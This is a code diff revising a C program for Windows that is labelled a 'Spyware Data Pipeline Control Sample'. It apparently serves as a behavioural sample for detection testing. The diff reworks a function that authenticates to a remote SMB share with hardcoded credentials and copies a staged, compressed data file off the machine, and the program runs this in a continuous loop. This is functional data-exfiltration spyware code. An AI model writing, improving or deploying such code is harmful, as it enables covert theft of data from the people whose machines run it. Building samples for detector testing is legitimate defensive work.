@@ -1,6 +1,6 @@
 /*
-   A04_4d: Spyware Data Pipeline Control Sample (Staging + Compression + SMB Robust Auth Variant)
-   Behavioral Scope: Local metric aggregation, native memory compression, robust authenticated SMB upload.
+   A04_4d: Spyware Data Pipeline Control Sample (Staging + Compression + Direct UNC Auth Variant)
+   Behavioral Scope: Local metric aggregation, native memory compression, direct UNC authenticated SMB upload.
 */
 
 #include <windows.h>
@@ -142,33 +142,33 @@ void stage_and_exfiltrate_compressed(const char *raw_payload)
         return;
     }
 
-    // Fix 3: Pre-emptively clear Z: mapping to prevent collisions before mounting
-    WNetCancelConnection2A("Z:", 0, TRUE);
+    // 3. Pre-emptively clear any existing connections to this specific remote resource path
+    WNetCancelConnection2A(REMOTE_SMB_REMOTE, 0, TRUE);
 
-    // Fix 1: Properly initialize the NETRESOURCEA block to clean out garbage stack memory
+    // 4. Authenticated SMB Phase: Initialize NETRESOURCEA for direct UNC authentication
     NETRESOURCEA nr = {0};
     nr.dwType = RESOURCETYPE_DISK;
-    nr.lpLocalName = "Z:";
-    nr.lpRemoteName = (LPSTR)REMOTE_SMB_REMOTE;
+    nr.lpLocalName = NULL;                      // Explicitly NULL: Bypasses local volume mapping logic completely
+    nr.lpRemoteName = (LPSTR)REMOTE_SMB_REMOTE; // Target root share
     nr.lpProvider = NULL;
 
-    printf("[INFO] Attempting to map Z: drive to %s...\n", REMOTE_SMB_REMOTE);
+    printf("[INFO] Attempting direct UNC authentication to %s...\n", REMOTE_SMB_REMOTE);
     DWORD dwNetRet = WNetAddConnection2A(&nr, SMB_PASSWORD, SMB_USER, 0);
 
-    // Fix 2: Add specific verification check for credential collision errors (Error 1219)
+    // Verify session credential errors
     if (dwNetRet == ERROR_SESSION_CREDENTIAL_CONFLICT)
     {
         printf("[ERROR] Existing SMB session uses different credentials. Run: net use * /delete /y\n");
         return;
     }
-    else if (dwNetRet != NO_ERROR && dwNetRet != ERROR_ALREADY_ASSIGNED)
+    else if (dwNetRet != NO_ERROR)
     {
-        printf("[ERROR] SMB Drive mapping failed. Error Code: %lu\n", dwNetRet);
+        printf("[ERROR] SMB authentication failed. Error Code: %lu\n", dwNetRet);
         return;
     }
-    printf("[INFO] Z: drive successfully mapped.\n");
+    printf("[INFO] Remote UNC path authenticated successfully.\n");
 
-    // Fix 4: Use explicit UNC target path for more predictable static analysis parsing
+    // 5. Transmission Phase: Copy file directly via specific static UNC naming configurations
     BOOL bCopy = CopyFileA(LOCAL_STAGE_PATH, REMOTE_SMB_SHARE, FALSE);
     if (bCopy)
     {
@@ -179,15 +179,15 @@ void stage_and_exfiltrate_compressed(const char *raw_payload)
         printf("[ERROR] File transfer to UNC path failed. Error: %lu\n", GetLastError());
     }
 
-    // 5. Cleanup Phase: Tear down connection state cleanly
-    DWORD dwDelRet = WNetCancelConnection2A("Z:", 0, TRUE);
+    // 6. Cleanup Phase: Terminate connection context session windows cleanly
+    DWORD dwDelRet = WNetCancelConnection2A(REMOTE_SMB_REMOTE, 0, TRUE);
     if (dwDelRet == NO_ERROR)
     {
-        printf("[INFO] Z: drive successfully unmapped.\n");
+        printf("[INFO] Authenticated remote session successfully dropped.\n");
     }
     else
     {
-        printf("[WARNING] Failed to unmap Z: drive. Error Code: %lu\n", dwDelRet);
+        printf("[WARNING] Failed to drop remote session window cleanly. Error Code: %lu\n", dwDelRet);
     }
 }
 
@@ -240,7 +240,7 @@ int main()
         return 1;
     }
 
-    printf("[INFO] Staging + Compression + Robust SMB upload pipeline running\n");
+    printf("[INFO] Staging + Compression + Direct UNC SMB pipeline running\n");
 
     while (TRUE)
     {
